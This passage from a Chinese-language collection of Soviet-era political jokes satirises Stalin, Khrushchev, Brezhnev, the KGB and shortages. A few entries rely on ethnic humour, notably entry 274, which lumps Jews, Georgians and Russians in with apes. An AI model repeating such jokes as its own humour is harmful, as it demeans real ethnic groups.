问：什么是最短的笑话？\n答：共产主义。\n问：什么是最长的笑话？\n答：赫鲁晓夫在党代会上的讲话。\n187: # 问：如果社会主义在格陵兰建成会怎样？\n答：首先，雪只有在有配给票时才会下，其次它只会被分配给克格勃军官和他们的家属。\n188: # 问：什么单词以 R 开头且没有结尾？\n答：重组（Reorganization）。\n189: # 问：尼克松来莫斯科时，他和赫鲁晓夫绕克里姆林宫赛并跑了第一，我们该怎么报道？\n答：“在国际长跑比赛中，我们的第一书记同志获得了光荣的第二名，尼克松先生则为倒数第二。”\n190: # -我的妻子已经在厨艺学校学了三年了。\n-哇，那她的厨艺一定很好咯？\n-没有，她们刚学习到苏共第二十次代表大会。\n191: # -爸，您能给我套车钥匙么？\n-好，别丢了，儿子，七年之后我们就会领到车！\n192: # -我想预定一辆小汽车。需要多久？\n-从今天开始正好十年。\n-上午还是下午？\n-有区别么？\n-那天上午我们还请了管子工。\n193: # 监狱里两个囚犯正交流经验。\n“你是因为政治犯罪被捕的么？”\n“当然。我是个管子工，被党委员会叫去修下水管。我看了看，说，‘整个体系都该换换了’，于是我就被判了 7 年。”\n194: # 一个男的在报亭买了一份真理报。\n摊主好奇地问道：“同志，每天早上你都在我这儿买真理报，可连翻都不翻开就扔掉，为什么？”\n男人答道：“我只对头版感兴趣。我在等一份讣告。”\n摊主奇怪了：“可是头版上没有讣告部分啊？”\n男人答道：“我向您保证，我想看的讣告会上头版的。”\n195: # 1978 年勃列日涅夫建议乌尔霍·吉科宁总统（芬兰总统）取消苏芬两国的边境线。吉科宁最初很感兴趣，不过后来拒绝了，因为他认为自己太老，管理那么大个国家有些难度。\n196: # 勃列日涅夫在路上看到一个人扛着西瓜回家。他停下车，招呼那人，要那人把西瓜卖给他。\n“好吧，勃列日涅夫同志。”那人说，“您选一个吧。”\n“可只有一个西瓜啊。”\n“我们选您的时候就是这样。”\n197: # 一个老师领着她的学生经过公园，路上看到了一只小白兔。他的学生都是城里人，没见过白兔。\n“你们知道这是什么么？”老师问。没人知道。\n“孩子们，”老师试图引导学生的思路，“他是我们常读的许多故事、歌曲和诗歌中的角色。”\n一个学生赶忙向小兔敬礼，恭敬地说：“原来您长这样，列宁爷爷！”\n198: # 斯大林去看一场苏联喜剧电影的首映式。在影片播放时他一直快活地大笑，不过在电影结束之时他突然问道：\n“好吧，我喜欢这电影。可为什么那个丑角的小胡子和我的一样？”\n所有人都噤若寒蝉，只有一人怯怯地提议道：“斯大林同志，要不要让演员把胡子剃了？”\n斯大林答道：“好主意，枪毙前先把胡子剃了。”\n199: # 斯大林在党代会上作报告。突然有人打了个喷嚏。\n“谁打喷嚏了？”\n寂静。\n“第一排起立！把他们毙了！”\n第一排的人都被毙了。斯大林又问：\n“谁打喷嚏了？”\n还是没人回答。\n“第二排起立！把他们毙了！”\n第二排也都被枪毙了。\n“谁打喷嚏了？”\n最后，大厅里响起了一个哽咽的声音：“是我，是我！”\n斯大林说：“小心身体，同志，别感冒！”\n200: # 问：美国和苏联宪法有什么区别？不是都保证言论自由吗？\n答：当然，不过美国宪法也保证言论后的自由。\n201: # 问：苏联是世界上进步最快的国家吗？\n答：当然！生活在昨天就已经比明天好了！\n202: # 斯大林找来拉狄克：\n“我知道你在传播关于我的笑话。这很无礼。”\n“为什么？”\n“因为我是全体人民的伟大领袖、导师和朋友。”\n“天地良心，我没和任何人讲过这个笑话。”\n203: # 撒切尔、科尔、昂纳克和契尔年科在高峰会议的间隙坐在一个酒吧里谈话。\n起先，契尔年科站起来，撕破自己的衬衣，骄傲地指着自己毛绒绒的胸膛说：“这就是俄罗斯的针叶林带！”\n撒切尔夫人不甘示弱，也撕破自己的衣服说：“看这里，先生们，这是两个优质的英镑! ”\n科尔做出一个不屑一顾的手势和一副意味深长的表情，他脱下裤子，露出屁股说：“这里，你们看到的是分裂的德国。”\n其他的人都惊呆了，迄今无人知道德国是如此硕大。\n现在，昂纳克倍感压力，他站起来，扣紧了自己的裤裆，巧妙地回击科尔说：“这里是隔栏，我向你们发誓，这玩意儿不会再变高了。”\n204: # 一名观光客在列宁格勒旅行时，途中因为滑了跤而跌入正在施工的水沟中，满身肮脏的美国人气愤地向导游说：\n“在美国，危险场所都会竖起红旗，才可以避免危险啊！”\n“我国也是一样啊！”导游说：“难道你在入境时没看见竖起着大红旗吗？”\n205: # 老师问：“弗里茨，为什么你总是说成‘我们的苏维埃兄弟’？应该说成‘苏维埃朋友’才对。”\n弗里茨回应道：“好吧，但是朋友的话，你是可以选择的。”\n206: # 问：苏联人民真的不需要立体音响设备吗？\n答：原则上，是的。人们从各个方向听到的东西几乎都是一模一样的。\n207: # 问：我们劳动营的条件真的是很棒吗？\n答：原则上，是的。五年前，我们的一个听众对此抱有怀疑，所以他被派去实地调查。他看来真的很喜欢那里，到现在也没有回来。\n208: # 问：弗拉基米尔·马雅可夫斯基真的是自杀的吗？\n答：是的，确实是的，甚至他的临终遗言还保存下来了呢：不要开枪，同志们！\n209: # 一天晚上，埃里希·昂内克和情人在豪华寝室里说着枕边悄悄话。他心情舒畅，慷慨地许诺她一个礼物，要什么都行。\n她想了一会，回答说：“哦，埃里希，如果让你一定要为我做一件事的话，我希望是：开放柏林墙，一天就够了。”\n昂内克说：“当然没问题，亲爱的。”不过他对她这样的请求有些不解，就问，“为什么要我做这样一件事呢？”\n情人回答说：“我只想和你单独享受二人世界。”\n210: # 问：一辆卫星牌汽车停在红灯前，灯变绿了，车却没动，是怎么回事？\n答：地上有口香糖。（东德的卫星牌汽车以发动机质量差闻名）。\n211: # 昂内克早晨站在阳台上：“早上好，亲爱的太阳！”太阳回答说：“早上好，昂内克同志!”\n昂内克中午站在阳台上：“中午好，亲爱的太阳！”\n太阳回答说：“中午好，昂内克同志！”\n昂内克晚上站在阳台上：“晚上好，亲爱的太阳!”\n太阳回答说：“去死吧，我现在在西德！”\n212: # 东德的爱森纳赫（依发牌瓦尔特堡汽车厂所在地，simongster）人听说日本人这样测试汽车的密封性：他们把一只猫关进车里，三天之后，如果这猫窒息而死，那么零部件的密封性能判定合格。凡事爱争第一的爱森纳赫人决定效仿，用同样的方法来测试瓦尔特堡汽车。三天之后，如果这猫还呆在汽车里没有跑掉的话，那么零部件就被判定密封性合格。\n213: # 昂内克死后敲开彼得的大门，后者看着他问到：“你是不是走错了？到地狱去！”\n半年后，两个小鬼敲开彼得的门。\n彼得：“你们不属于这里！”\n他们回答说：“不，我们是第一批难民！”\n214: # 一架东德国内航班的飞机被劫持到科隆－波恩机场。 飞机在跑道上被西德 GSG9 特种反恐部队监控起来。东德中央委员会开了两个小时会议，研究该如何应对。最后得出了一个决定，问一下劫持者，到底有什么要求。\n劫持者是一个父亲，育有两个孩子，他提了三个要求：\n－他想要预订的卫星牌汽车能够最终交货，为此他已经等了 14 年；\n－他想给他的家庭要一个三居室的房子；\n－他想要今年去波罗的海度假。\n谈判人员向中央委员会汇报了上述愿望。委员们又了几个小时的会议，讨论是否应该屈服他的要求。米尔克（注：斯塔西头目）警告说，鉴于有人会效仿，最好不要让步。\n然后有人建议，最好先弄清楚，如果不满足劫匪的要求的话，他会用什么来威胁他们。\n谈判人员又被送回科隆－波恩机场。\n劫匪响亮地回答说：“那么我每个小时就释放两名人质……”\n215: # 如果撒哈拉变成社会主义会发生什么？\n第一个十年没有什么变化，但是此后沙子会逐渐短缺。\n216: # 在一列火车上，同一车厢里坐着列昂尼德同志，菲德尔（·卡斯特罗）先生，理查德先生和他的美国律师。\n途中，列昂尼德同志取出一瓶伏特加酒，逐个给大家斟酒，然后将剩下的半瓶往窗外一甩。“你这样不太浪费了吗？”理查德先生惊奇地问。“苏联有的是伏特加，”列昂尼德同志非常骄傲地说，“我们根本喝不完。”\n过了一会，菲德尔先生拿出几根哈瓦那雪茄分给同伴，他自己也点燃了一根，可没吸几口就把它扔出了窗外。\n理查德先生又奇怪地问：“我想古巴的经济并不怎么景气，为何这么好的雪茄就给扔了呢？”\n菲德尔先生满不在乎地说：“在古巴，我们有的是雪茄，怎么也抽不完。”\n理查德先生沉默了一会儿，突然站起来，抱起身边的律师，硬把他塞出了窗外……\n217: # 苏斯洛夫同志和谢列平同志吵得面红耳赤，没有注意尼基塔同志就在旁边。\n苏斯洛夫同志说：你是个大白痴！\n谢列平同志说：我这辈子从没见过像你这么蠢的猪！\n这时候尼基塔同志插口劝阻：两位同志请注意。你们忘了我在这里。\n218: # 克格勃工作人员来到赫鲁晓夫的别墅，向赫鲁晓夫汇报市面上流传的讽刺他的笑话。在去别墅的路上工作人员对赫鲁晓夫精心照料的花园很是欣赏，于是开头就说：\n“尼基塔·谢尔盖耶维奇，您生活的很好！”\n“嗯，”赫鲁晓夫答道，“很快所有的苏联人都将这样生活。”\n“请问，”克格勃工作人员惊讶地问道，“那么我们中谁来讲笑话呢？是您还是我？”\n219: # 苏联反犹太主义者：“外国报纸全都是犹太人办的！”\n苏联犹太人：“没错！所以外国报纸寄到这里时都给施了割礼。”\n220: # 在被遣送回亚美尼亚前，亚美尼亚人对留在西方的同伴商定，为了提防当局的书信检察，要是在苏联情况不好，我就用绿色的墨水给你写信。后来，很快就来信了，但是是用通常的墨水写的，上面说：一切都非常好，我有了自己的住宅，找到了很好的工作，什么都有，如果说有什么不足的话，那也微不足道，比如说，我们这里很难弄到绿墨水。\n221: # “你为什么要去以色列？”\n“我太烦了，什么事都得庆祝，买到香肠得庆祝，买到手纸也得庆祝。”\n222: # 通过卫星发射到太空的狗这一事实科学地证明了，任何母狗都能升到不可思议的高度。\n（注：母狗在俄语是骂人话：狗东西）\n223: # 我们知道世界的新闻\n——从塔斯社的反驳和辟谣中。\n224: # 在会议上，农庄主席在历数苏维埃政权给了普通人多少实惠：\n“你们看玛丽亚·彼得洛夫娜，她原来是一个普通的农民，现在却管理一个俱乐部；你们看别拉捷娅·费道洛夫娜，原来也是一个普通的农民，现在管理一个图书馆；你看斯捷潘·米特拉发内奇，原来是一个十足的傻子，现在却是党组织的书记。”\n225: # 斯大林死后， 因为被赫鲁晓夫视为禁忌， 因此希望把斯大林的遗体葬在海外，于是苏联向各国征求意愿：\n英： 我们这边已经有丘吉尔，大战的英雄有一个就很够了。\n德： 我们这边已经有希特勒，独裁者有一个就太多了。\n这时， 以色列表明同意的意见。但是赫鲁晓夫马上脸色变青， 拼命反对——\n“靠！ 那里以前有人复活过啊！”\n226: # 关于苏联的乐队：\n——对苏联而言，什么是一个乐队三重奏组合？\n——那是去西方的旅行演出的一个四重奏组合刚刚回来。\n227: # 莫斯科大学毕业四十年的同学聚会，柳德米拉一眼就认出了当年热恋过的瓦西里。旁人都问，怎么会这么快就从一堆老头中认出自己当年的情人？\n“因为他还穿着当年的那件大衣！”\n228: # 一个匪徒试图劫持苏联民航飞机去伦敦，结果在飞机上就被一个英勇的阿塞拜疆的农民当场制止。记者采访这个阿塞拜疆农民何以如此勇敢，结果农民小声说：\n——同志啊，我偷偷带了两箱卷心菜在飞机上，打算去莫斯科卖了，如果那混蛋带我们去伦敦，这两箱卷心菜就不值钱了。\n229: # 苏联的一个比喻，未必是笑话：\n人生好比过马路，前半段往左看，后半段往右看。\n苏联 70 年以后的中央委员大都 60 岁以上，后面的事情就可以知道了。\n230: # “波兰人为什么怀念捷尔任斯基？”\n“因为他比其他任何波兰人杀的俄国人都多得多。”\n（注：捷尔任斯基系全俄肃清反革命和怠工分子委员会——简称肃反委员会/契卡——的第一位领导人，该组织后来演变为国家政治保安局-内务部-克格勃）\n231: # 在记者招待会上，有人问勃列日涅夫：“列昂尼德·伊里奇，这什么苏联缺乏肉制品？”\n“问题的原因在于，我们正在突飞猛进地奔向共产主义，而牲畜的生长却跟不上我们！”勃列日涅夫明确地回答。\n232: # 昨天莫斯科发生了地震，但学者们对此表示怀疑，因为莫斯科处在非地震带上。最后经过研究，并非是地震，而是勃列日涅夫同志佩有勋章的衣服掉在了地上。\n233: # 问：苏联农业面临的主要障碍是什么？\n答：主要的障碍有 4 个：春天、夏天、秋天和冬天。\n234: # 苏斯洛夫去世了。\n亲朋好友都来参加悼念活动，医疗组的医生们也出席了。\n其中一位医生突然发现勃列日涅夫神情恍惚，不大正常，就对同伴们说：“我们要记住，现在患大脑动脉硬化症的人不少，这个病已经成为我们的主要敌人了。”\n“不对。”勃列日涅夫听到他们的议论后说，“现在我们的主要敌人不是大脑动脉硬化症，而是纪律涣散症。你们看，大家都等了半个多小时了，可是苏斯洛夫还没来！！\u0026rdquo;\n235: # 在苏共 20 大上，赫鲁晓夫在做秘密报告前突然消失了。但是过了几分钟后他又回来了，并登上了主席台。\n人们问他：“赫鲁晓夫同志，您刚才去哪了？”\n“我去列宁墓里看了看，摸摸斯大林还有没有脉搏，以防万一。”\n236: # 赫鲁晓夫去集体农庄视察，一不小心掉到了青饲料储藏窖里。有个农民把他拖了上来。赫鲁晓夫对他说：“谢谢你，好兄弟。但是请不要对任何人说我掉到了窖里。”\n“尼基塔同志，也请您不要对任何人说是我把您从地窖里救了上来。”\n237: # 访问苏联的尼克松问勃列日涅夫：\n“为什么苏联工人不造反？”\n勃列日涅夫没有回答他，而是他带到了车间。他向工人们说道：\n“从明天开始，你们将会缩减工资！”（掌声）\n“将要提高工时！”（掌声）\n“每十个人就要吊死一个！”（掌声，有人问，是自己准备绳子还是由工会提供？）\n238: # 美国人、英国人、和苏联人夸口，说能给猫吃下芥茉。\n美国人逮住猫，把芥茉塞到了猫嘴里。\n“这是暴力！”苏联人抗议道。\n英国人把芥茉放在两片香肠里，给猫吃下去。\n“这是欺骗！”苏联人抗议道。\n苏联人把芥茉抺在猫的尾巴上，猫敖敖叫着，用嘴去舔他的尾巴。\n“请注意，他是自愿的，并且唱着歌！”\n239: # 勃列日涅夫拿着发发言稿，开始发言。\n“犹太复国主义者同志们！”\n听众疑惑不解，勃列日涅夫于是又瞄了发言稿一眼：\n“犹太复国主义者！同志们，他们又在准备……\n240: # 问：为什么勃列日涅夫能出国，安德罗波夫却不能？\n答：因为前者安的是电池，后者接的是电线。 （勃列日涅夫用心脏起搏器，安德罗波夫用透析机）\n241: # 拉宾诺维奇被开除出党，原因有三个。\n甲：当政治局书记来到他的办公室的时候，那里还悬挂着赫鲁晓夫和勃列日涅夫的肖像：\n“你为什么你到现在还没有摘掉这个傻瓜？”\n“是哪一个？ ”\n乙：看到政治局委员豪华的葬礼，拉宾诺维奇说：\n“真是浪费钱财，用这些钱我能安葬所有的政治局委员。 ”\n丙：书记问：“为什么没有参加最后一次党的会议？”\n“我哪知道哪个是最后一次。 ”\n242: # 苏联时期的智力测试：什么长达两公里并且老吃白菜？\n答案：莫斯科肉店前排的队。\n243: # 列宁说：“共产主义=苏维埃+电气化”。\n所以：\n苏维埃=共产主义-电气化\n电气化=共产主义-苏维埃\n244: # 苏联海军元帅伊万·伊萨科夫于 1938 年起担任苏联副海军人民委员。1946 年的一天，斯大林打电话给他，说考虑任命他为海军参谋长。伊萨科夫回答：“斯大林同志，我得向您报告。我有严重缺陷，有一条腿在战争中受重伤被截掉。”\n“这是您认为必须报告的唯一缺陷吗？”\n“对。”\n“我们原先那位参谋长连头脑都没有，还照样坚持工作。您不过就缺条腿，没什么了不起。”斯大林说。\n245: # 书记：我们苏联皮鞋的产量是美国的两倍！\n群众：而且重量也是他们的四倍！\n246: # 某干部去视察植树工作。只见两个青年，一个在挖树坑，另一个随后用土填上。\n干部很奇怪，问他们在干什么。\n一个青年说：“我和彼得、伊万是植树的，我负责挖树坑，彼得负责插树苗，伊万负责填土。今天彼得生病了不能来，可是我们还要坚持工作啊！这不，我和伊万来了……”\n247: # 戈尔巴乔夫时期。一男子来到酒馆……\n男子：“来瓶儿伏特加！”\n侍者：“10 卢布。”\n男子：“上次来还是 5 卢布，怎么……？”\n侍者：“伏特加 5 卢布，另外 5 卢布是党的革命基金。”\n男人不情愿地掏出 10 卢布递给侍者。奇怪，侍者又找了他 5 卢布。\n男子：“怎么又找了 5 卢布？”\n侍者：“酒都卖光了。”\n248: # 苏联人造卫星试验中动用了以下力量：\n东德的火箭；\n罗马尼亚的能源；\n捷克的电子设备；\n俄罗斯的狗。\n（注：讽刺经互会，苏联的一切都是从东欧国家搞来的。事例为苏联用火箭将小狗莱卡送上太空。）\n249: # 勃列日涅夫出访埃及。安瓦尔·萨达特总统请求苏联提供三笔经济援助。\n“第一笔是 100 万吨煤。”安瓦尔说。\n“没问题。”勃列日涅夫答道。\n“还要 20 条远洋货轮。”\n“完全可以！”\n“最后是一个小小要求，我想要一辆自行车，送给我的孩子做生日礼物。”\n“那可不成，”勃列日涅夫皱起了着眉头，“波兰人不生产自行车。\n250: # 苏联式的选举：\n第一次苏联式的选举是由上帝发明的。上帝把夏娃带到亚当面前，并宣布道：“选择你的妻子吧！孩子。”\n251: # 在政治局会议上，勃烈日涅夫兴致勃勃地说：“同志们都说我那三本回忆录写得好，哪天给我弄一套，我也读一读。”\n（注：勃列日涅夫获得了列宁文学奖的三本回忆录《小地》、《复兴》、《垦荒地》在其死后被揭露系捉刀之作）\n252: # 三个人准备入党，但是都担心自己的非无产阶级出身：\n“实话说，我爸爸有一个小工厂，当然不能和斯大林汽车厂相比。”－—一个人说。\n“实话说，我爸爸有一个小商店，当然不能和国营百货商店相比。”—－另一人说。\n“实话说，我妈妈有一个小妓院，当然不能和现在的相比。”—－拉宾诺维奇说。\n253: # 在勃列日涅夫的住宅里响起了电话铃声，妻子拿起了话筒，传来了一个女人的声音。\n妻子：“你是哪位？”\n女人：“我是他的中学同学。”\n妻子：“你肯定不是他的中学同学，列昂尼德什么时候也没上过学校。”\n254: # 法学家、外科医生、建筑师和共产主义者争论谁的职业更古老：\n“当上帝把亚当和夏娃逐出伊甸园地，这就是法律行为。”——法学家说。\n“请听我说，在这之前上帝用亚当的肋条造出夏娃时，这就是外科手术。”——外科医生说\n“请听我说，比这更早的时候上帝创造了世界，在这之前完全是一片混乱。”——建筑师说。\n“谁创造了混乱？当然是共产主义者。”——共产主义者叫道。\n255: # “你已经储藏肥皂和洗衣粉了吗？”\n“没有，怎么了？”\n“哎，你怎么这样，要知道尼基塔同志要主管化学工业了！”\n256: # “列昂尼德同志又住院了。”\n“作什么手术？ ”\n“扩胸手术。”\n“为什么？”\n“勋章没地方挂了。”\n257: # 早年莫斯科修地铁，工程师将方案上报斯大林审批。不久，方案发下来，上面有斯大林的签字，细心的工程师发现图纸上多了一个圆型的茶杯印，于是莫斯科地铁就多了一条环形线。\n258: # 说：曾经有法老和犹太人，法老灭绝了，犹太人活下来了；曾经有宗教裁判官和犹太人，前者都死绝了，后者活了下来，曾经有纳粹和犹太人，前者灭绝了，后者存活了下来，现在有共产主义者和犹太人。\n问：你到底想说什么？\n答：没什么，只是说犹太人可能活到最后。\n259: # 问：听说莫斯科奥运村的房子是由特殊材料制成的，请说一下，它的成份是什么？\n答：我这就回答你：10%的水泥和 90%的麦克风。\n260: # 问：工兵和报纸的编辑有什么共同之处？\n答：他们不论是谁，一生只能错一次。\n261: # 问：报纸和广播什么最有用？\n答：当然是报纸。你不能用电视擦桌子，你不能用电视擦屁股。\n262: # 问：广播电台总说，我们的食品充足，可是冰箱里却总是空的，这是为什么？\n答：把广播连到冰箱上就好了。\n263: # 苏联社会变化在于，在斯大林时代，当有陌生人敲门的时候，屋子里的人都停止说政治笑话而把酒拿出来，到了 70 年代以后，还有陌生人敲门的话，他们会开始说政治笑话而把酒藏起来。\n264: # 谁能把大象装进冰箱里呢？超级政治家能够办到。\n第一步：抓一只猫，让猫在强烈的政治攻击下承认自己是大象。\n第二步：公布计划：生产一种能装进大象的冰箱，动员国民捐款。实际上并不生产。\n第三步：收买证人，证明大象已经被装进冰箱里。\n第四步：利用媒体优势反复强调“猫是大象的祖先”这一理论，以防后患。\n265: # 苏联健康委员会向列昂尼德同志建议：从即日起，我们不打算再使用老鼠做医学实验，取而代之的是来自于克格勃的志愿者，所列的理由主要有三：\n一、由于粮食紧缺，直接影响到老鼠的生存。而我国目前的克格勃成员要比老鼠多得多；\n二、实验人员在对克格勃志愿者下手时的罪恶感要比对老鼠下手时小得多；\n三、无论你怎样努力，有些事情老鼠还是不会去做的，而对克格勃来说没有他们不能去做的事情。\n266: # 外国领导人要来参观莫斯科幼儿园，问小朋友：“你们国家领导人是谁？”\n答：“北极熊！”\n“你们国家最有名的动物呢？”\n答：“勃烈日涅夫！”\n“莫斯科哪个地方最高？”\n“当然是五百三十三米高的奥斯坦基诺电视塔了！”\n“不，是卢比扬卡广场上克格勃大楼的地下室。从那儿能看清全国每个角落的一举一动。”\n267: # 一次勃列日涅夫正在阅读一份克格勃关于移民申请越来越多的报告。\n勃列日涅夫转身跟柯西金说道，“要是我们把移民签证一直发下去，有一天这国家可得就剩下你和我啦。”\n柯西金回应道：“别把我算进去。”\n268: # 在敖德萨一间屋子的后院外传来了炮响。萨拉从窗户探出头去：“埃布拉姆，怎么了？是他们给商店送来肉了吗？”\n“不是，是因为勃列日涅夫到敖德萨了。”\n过了一会儿，礼炮声又响了。\n“埃布拉姆，听到了吗？他们给商店送来肉了！”\n“我说了，这是勃列日涅夫到了。”\n“怎么会，他们第一下打偏了吗？”\n269: # 赫鲁晓夫前来参观前卫派的美术展览。\n“这对该死的绿点和黄点是什么？”\n“这幅画，赫鲁晓夫同志，是表现我们英勇的农民在努力完成生产两亿吨谷物的计划。”\n“啊……哦……那这堆黑三角和红条条呢？”\n“这幅画描绘了工厂中我们英雄般的产业工人。”\n“那这个长耳朵的肥屁股呢？”\n“赫鲁晓夫同志，这不是画，是镜子。”\n270: # 一个老人和他的孙子在岸边看着眼前的河。\n“爷爷，这个地方是叫切尔诺贝利吗？是说这儿以前有个核电站吗？”\n“是的，我的孩子。”爷爷说着拍了拍孩子的头。\n“是说它有一天爆炸了么？”\n“是的，我的孩子。”爷爷说着拍了拍孩子的第二个头。\n271: # “爷爷，谢谢您的这条宠物蛇礼物。”\n“这不是蛇，孩子，这是切尔诺贝利的猫。”\n272: # 苏联式衰老：一个老人停在公寓门边上，手里拿着个空口袋想：\n“该怎么搞清楚我这究竟是正打算去食品商店还是刚从那儿回来呢？”\n273: # 问：苏联生产的汽车有可能在苏联的道路上跑到 120 千米每小时吗？\n答：可能，但只能有一次。\n274: # 问：第一批人类是什么？\n答：我们都知道人是从猩猩演化而来的。所以我们必须承认第一批人类包括：猿人、犹太人、黑猩猩、格鲁吉亚人、大猩猩和俄罗斯人。\n275: # 问：什么是俄罗斯式的生意？\n答：偷一筐伏特加，卖掉，然后用钱买伏特加喝掉。\n276: # 顾客问：我的钱会不会没有了？\n雇员答：不会，我们是银行。\n-那银行倒闭了呢？\n-没关系我们有总行你可以去那领。\n-那总行也倒闭了呢？\n-没关系，我们还有苏联啊。\n-那如果苏联倒闭了呢？\n-这么好的事花个几万卢布有啥可心疼的！\n277: # 一个持不同政见者被克格勃逮捕，罪名是在红场上散发传单。\n在法庭中他问法官：你们指控我派发反动传单，可我在红场上散发的明明都是空白纸张！！\n法官冷笑道：谁都知道那上面该写什么！\n278: # 二战中，一个英国兵、一个法国兵和一个苏联兵被德国人俘虏了。他们被判处死刑。\n行刑前，德国士兵问他们还有什么最后的要求吗？\n英国人说：“我要一杯啤酒。”他得到一杯啤酒。\n法国人说：“我想要喝杯葡萄酒。”——他的要求也得到了满足。\n轮到苏联人了，他说：“请狠命踢我的屁股。”\n两个膀大腰圆的德国兵过来，狠狠的把他踢出老远。说时迟，那时快，苏联人突然神勇爆发，挥拳打倒边上几个德国兵，夺得一挺机枪，把一群德国人全撂倒，然后三个人死里逃生。\n逃跑的路上，英国人和法国人说：“为什么不早点动手啊？我们差点都被枪毙了！”\n苏联人回答：“要是没人踢屁股，我们苏联人可什么也干不了！”\n279: # 病人在挂号的地方要找眼耳科医生，人们对她说只有耳鼻喉科医生和眼科医生。\n但是病人还是坚持说：“我还是想要眼耳科医生。”\n医生问：“你到底是哪里不正常？”\n病人：“看见的是一个，听见的又是一个。”\n280: # 精神病院里播放着赫鲁晓夫的演讲。讲完一段，所有人都热烈鼓掌，只有一个人站着不动。 旁人问道：“你为什么不鼓掌？”\n答：“因为我是医生。”\n281: # 问：为什么有人提出合理化建议，要在新型的电视机上安装活动刷，象汽车的风挡玻璃上的雨刷一样。\n答：这是因为总是有人往上吐痰。\n282: # 如果你把手放在暖气片上，它会讲些什么？\n天呐，你的手真是太暖和了。\n283: # 问：在罗马尼亚，比冷水还冷的是什么？\n答：热水。\n284: # 问：如何停止正在前进的阿尔巴尼亚坦克？\n答：打死正在推坦克的士兵。\n285: # 苏联计算机技术明显落后于当时最先进水平，特别是在集成电路方面，即使是芯片，由于一贯俄罗斯笨重的风格，变得特别大。\n于是，《真理报》只能这样报道：我国伟大的苏联制造出了世界上最大的芯片！\n286: # 一天，在莫斯科的一个公墓里，有两个人在交谈着……\n“你今天怎么愁眉苦脸的？”\n“昨天一辆班车出了车祸，车上无人幸免。”\n“哦，那是挺惨的，让我们一起为他们哀悼吧！”\n“不，我才不是为这个难过呢！”\n“那你……”\n“那辆班车是克格勃的。”\n“哦？那你还难过什么？”\n“车上有 3 个座位是空的。”\n287: # 赫鲁晓夫访问某集体农庄，谈到了乳品产量的问题。 赫鲁晓夫问道：“能不能上交更多的乳品，并且每年都确保增产，比如，百分之五？”\n集体农庄主席回答：“可以！赫鲁晓夫同志！”\n赫鲁晓夫很是高兴，继续问道：“百分之十呢？”\n“可以！赫鲁晓夫同志！”\n“百分之二十？”\n“可以！”\n“百分之五十？”\n“可以!”\n“百分之一百？”\n“啊？！！不可以！！！”\n“为什么？”\n“那样就只有水啦！”\n288: # 东德的两个肠道寄生虫爬了出来：\n“妈妈，那个大的，发光的东西是什么？”\n“儿子，这是太阳。”\n“妈妈，那波浪翻卷，闪着光的东西是什么？”\n“儿子，是大海。”\n“那绿色，散发着香味的地方是什么？”\n“是森林，儿子。”\n“有那么多好地方，我们为什么生活在屁股里？”\n“孩子，那是我们的祖国啊！”\n289: # （历史事件）肃反高潮阶段某晚\n斯大林和几位政治局委员在后花园休息，为哪颗是天狼星争论起来。\n有人建议给天文台打电话问问清楚，不料经过大清洗，天文台只剩下了内务部派去的值班军官。于是那军官赶忙去一位被软禁的老专家的家中咨询。\n老专家半夜见到内务部的车子出现，惊恐万状，当场自杀……\n290: # 勃列日涅夫不懂足球。有人送给他一个足球，\n他说：“谢谢您的勋章。但它看起来很像赫鲁晓夫。”\n291: # 在苏联，一个人在职工大会上演讲。他卖力地讲苏联人民多么的富有……\n这时拉宾诺维奇举起了手说：“我们的肉都到哪去了？”\n第二天，那个人又来演讲。\n海默维奇举手问，“我不想知道肉到哪里去了，我只想知道拉宾诺维奇到哪里去了？”\n292: # 问：阿尔巴尼亚为什么橡皮筋短缺？\n答：他们正计划发射一枚卫星。\n293: # 为什么齐奥塞斯库要在五月一日举办群众集会？\n“他要看看在冬天过后，还可以活下来多少人。”\n294: # 原来一直扮演斯大林的功勋演员，提着一个大皮箱去找赫鲁晓夫，说：“你把斯大林批臭了，我只好失业了。”\n演员走后，把皮包留在赫鲁晓夫办公室里．赫鲁晓夫好奇地打开一看，原来是扮演斯大林穿的大元帅服。他想，当年斯大林身着大元帅服好不威风啊，而且在人民中享有很高的威望，赫鲁晓夫就试着穿上元帅服，对着穿衣镜正上下打量。\n这时，米高扬轻轻推门进了赫鲁晓夫办公室，猛地一看，连忙跪倒在地求饶道：“斯大林同志，一切都不能怪我，全是赫鲁晓夫那家伙搞的鬼！”\n赫鲁晓夫一转身，打了米高扬两记耳光，骂道：“睁大你的狗眼仔细看看我是谁？！”\n295: # 米哈伊尔同志访美，罗纳德先生邀其享用米国最新科技成果：全自动超舒适马桶。用毕，米哈伊尔同志从心底赞叹，暗下决心：我国也要研制。\n回国后，一个攻关部门成立了，进展顺利。可是，罗纳德先生突然访苏，米哈伊尔同志措手不及，召开紧急会议，给攻关部门立下军令状：三天后必需制出。\n三天后，报曰：可也。\n米哈伊尔同志遂与罗纳德先生会谈，不久罗纳德先生有便意，端座马桶之上，事毕，感到的确舒适如意，心想，苏联的确厉害，这么短时间就研制出这幺舒适的马桶。不行，我得好好研究一下，为我国的发展提供第一手资料。于是，罗纳德先生又一次掀开马桶盖，扭了一下按钮。\n只见，马桶下伸出一只手，将罗纳德先生的脸仔仔细细地抹了一遍。\n296: # 尼基塔同志来华盛顿拜访约翰先生，约翰先生在白宫殷勤款待， 席间，厨房上了一道烤香肠。\n尼基塔同志吃了以后对其美味赞不绝口，约翰先生对尼基塔同志夸口说：“在我们美利坚农场，生产美味的香肠已经达到了完全自动化水平，你只要赶一头猪到香肠制造机的入口里去，过不多久机器的那一头就会自动出来一串一串的香肠…\n尼基塔同志边嚼着香肠边连连点头，约翰先生十分得意。 这时，坐在一旁的杰奎琳由于嫌香肠油脂多，吃了一点就吩咐把她的那份撤了。 尼基塔同志问约翰先生：“撤下去的香肠你们怎么办？” 约翰先生答道：“当垃圾倒掉呗！”\n尼基塔同志摇了摇头，说：“在我们那里，吃剩的香肠只要往我们的香肠制造机出口扔进去，机器的那一头过不了多久就会跑出一头猪来……”\n297: # 尼基塔同志看民主德国因盛产啤酒而每年赚进大笔外汇，决定仿效，开始派人研究制造啤酒的技术。第一批啤酒制造出来后，尼基塔同志送了一些样品给民主德国鉴定品质。\n一个月后，民主德国的乌布利希回函给尼基塔：“恭喜，尼基塔同志，贵国的马很健康！”\n298: # 苏联时期莫斯科街头，一个男孩拿着算数书问：“爷爷，队列是什么？”\n“你要知道，在腐朽的封建沙皇时代，商店里没有足够的肉，因此人们不得不在商店门前排长长的队伍等着买肉。这就叫队列。懂了么？”\n“好的，爷爷。不过肉是什么？”\n299: # 